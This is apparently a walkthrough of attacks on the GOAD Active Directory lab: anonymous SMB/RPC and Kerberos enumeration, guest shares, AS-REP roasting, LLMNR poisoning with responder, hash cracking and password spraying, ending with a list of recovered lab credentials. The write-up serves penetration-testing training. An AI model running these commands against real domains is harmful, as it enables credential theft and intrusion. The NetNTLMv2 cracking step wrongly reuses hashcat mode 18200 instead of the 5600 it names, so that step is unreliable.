### RPC / SMB
Anonymous RPC sessions can be enabled in the Windows registry under `Software\\Policies\\Microsoft\\Windows NT\\Rpc: Restrict Unauthenticated RPC Clients`. For anonymous `SMB` sessions, the registry can be found under `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Controls\Lsa`. If this is registry flag is set to true, the following commands can be used to enumerate the `smb` or the `rpc` service:
```bash
nxc smb 10.3.10.11 --users
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# --users: a flag which tells nxc to return a list of available users.
```

Alternatively, these tools may also be used:
```bash
enum4linux 10.3.10.11
```
```bash
# or
```
```bash
rpcclient -U "north\\" 10.3.10.11 -N
```

After anonymously scanning `DC02` (`WINTERFELL`) for `--users`, i receive the credentials `samwell.tarly:Heartsbane`, which are stored as clear-text in a comment. These credentials can be used in another `nxc --users` scan to find the following users:
```bash
Administrator
Guest
krbtgt
localuser
arya.stark
eddard.stark
catelyn.stark
robb.stark
sansa.stark
brandon.stark
rickon.stark
hodor
jon.snow
samwell.tarly
jeor.mormont
sql_svc
```

### Kerberos
If anonymous RPC sessions are allowed, it is also possible to enumerate the users using `Kerberos`. As `GOAD` is game-of-thrones themed, a word-list of the cast can be used:
```bash
curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' > users.txt
```

The `nmap` script `krb5-enum-users` can then be used to enumerate the users using `Kerberos`, and this does not increment the `-BadPW-` count:
```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=users.txt" 10.3.10.10
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# for WINTERFELL, set realm to 'north.sevenkingdoms.local', and IP to 10.3.10.11
# for MEEREEN, set realm to 'essos.local', and IP to 10.3.10.12
```

The following users were enumerated on `DC01` (`KINGSLANDING`):
```bash
robert.baratheon@sevenkingdoms.local
stannis.baratheon@sevenkingdoms.local
cersei.lannister@sevenkingdoms.local
renly.baratheon@sevenkingdoms.local
joffrey.baratheon@sevenkingdoms.local
jaime.lannister@sevenkingdoms.local
tywin.lannister@sevenkingdoms.local
```

The following users were enumerated on `DC02` (`WINTERFELL`):
```bash
catelyn.stark@north.sevenkingdoms.local
jeor.mormont@north.sevenkingdoms.local
jon.snow@north.sevenkingdoms.local
sansa.stark@north.sevenkingdoms.local
rickon.stark@north.sevenkingdoms.local
samwell.tarly@north.sevenkingdoms.local
arya.stark@north.sevenkingdoms.local
hodor@north.sevenkingdoms.local
robb.stark@north.sevenkingdoms.local
```

The following users were enumerated on `DC03` (`MEEREEN`):
```bash
jorah.mormont@essos.local
viserys.targaryen@essos.local
missandei@essos.local
khal.drogo@essos.local
daenerys.targaryen@essos.local
```

### SMB Guest Shares
Some `SMB` shares allow `Guest` access. To find shares that do this, the following `netexec` command may be used:
```bash
nxc smb 10.3.10.10-23 -u 'a' -p '' --shares
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: the username to use. "a" resolves to Guest
# -p: the password to use. empty here
# --shares: a flag which tells nxc to return a list of available shares.
```

A share was found on `CASTELBLACK` named `all` which is readable by the `Guest` account. It can be interacted with as follows:
```bash
smbclient -U 'a' --no-pass "//10.3.10.22/all"
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -U: username to use. here 'a', as it resolves to `Guest`
# --no-pass: do not use a password
```

Using `get` on the file `arya.txt` reveals the clear-text credentials `arya.stark:Needle`.

### ASREP-roasting
This technique tries to find users which do not have `Kerberos pre-authentication` enabled (the flag `UF_DONT_REQUIRE_PREAUTH` is set). For this attack, authentication requests (`AS-REQ`) are sent to the domain controller. If this pre-authentication flag is not set, the domain controller will reply with the ticket-granting-ticket (`TGT`) of that user. If the used password is weak, these `TGT`'s can then be cracked to receive the clear-text password.

For this, a list of valid users is required. It can be gathered using previous anonymous enumeration techniques. The command to execute `ASREP-roasting` is the following:
```bash
impacket-GetNPUsers sevenkingdoms.local/ -no-pass -usersfile users.txt
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# also try with 'north.sevenkingdoms.local' and `essos.local`
```

It turns out that the two users `missandei@essos.local` and `brandon.stark@north.sevenkingdoms.local` do not have this `Kerberos` flag set. Their `TGT` hashes can then be cracked using mode `18200` (`Kerberos 5, etype 23, AS-REP`) of the tool `hashcat`:
```bash
hashcat -m 18200 ./hash.txt ./rockyou.txt
```

The received clear-text passwords are these:
```bash
brandon.stark:iseedeadpeople
missandrei:fr3edom
```

### Responder
`responder` may be used to listen to the local network for `DNS` fallback protocols such as `LLMR` (`Link Local Multicast Resolution`). These fallback protocols are used if `DNS` fails, for example if someone searches for a non-existent domain. `responder` may act as an server which does provide these resources, but starts a `challenge-response` interaction for them, which results in a `NTLMv2` hash if someone mis-types a domain name.

To start a `LLMNR` attack, the following `responder` command can be used:
```bash
sudo responder -I eth0 -wF -v
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: enables WPAD rogue proxy server. responds to WPAD requests
# -f: enforces authentication, which leads to NTLMv2 hashes
```

After waiting a while, the `NTLMv2` hashes of the users `eddard.stark` and `robb.stark` are captured. These can only be attempted to be cracked, as they can not be passed onto other services. To crack these, the mode `5600` (`NetNTLMv2`) of `hashcat` can be used:
```bash
hashcat -m 18200 ./hash.txt ./rockyou.txt
```

This leads to the credentials `robb.stark:sexywolfy`!

### Password Spraying
A typical `username = password` password spraying attack may be used as follows:
```bash
nxc smb 10.3.10.10-23 -u users.txt -p users.txt --no-bruteforce
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# --no-bruteforce: only uses user1:pass1, user2:pass2, and so on.
```

This leads to the credentials of `hodor:hodor`!

Alternatively, a password spraying attack using weak passwords can be used. A nice guess for passwords may be the format `SEASON:YEAR`, or `COMPANY_NAME:YEAR`. As game of thrones typically is associated with winter, i have tried these passwords:
```bash
Winter2018
Winter2019
Winter2020
Winter2021
Winter2022
Winter2023
Winter2024
Winter2025
```
With the following `nxc` command:
```bash
nxc smb 10.3.10.10-23 -u users.txt -p passwords.txt
```
This gave me the new account `rickon.stark:Winter2022`.

### Summary of users
```bash
NORTH/samwell.tarly:Heartsbane # Anonymous SMB enum, Password in tje Desc.
NORTH/arya.stark:Needle # SMB Guest-access, Password in a file
NORTH/brandon.stark:iseedeadpeople # AS-REP Roasting, Hash cracked
ESSOS/missandei:fr3edom # AS-REP Roasting, Hash cracked
NORTH/robb.stark:sexywolfy # LLMNR Attack, Hash cracked
NORTH/hodor:hodor # Password Spray, name=pass
NORTH/rickon.stark:Winter2022 # Password Spray, guessable password
```
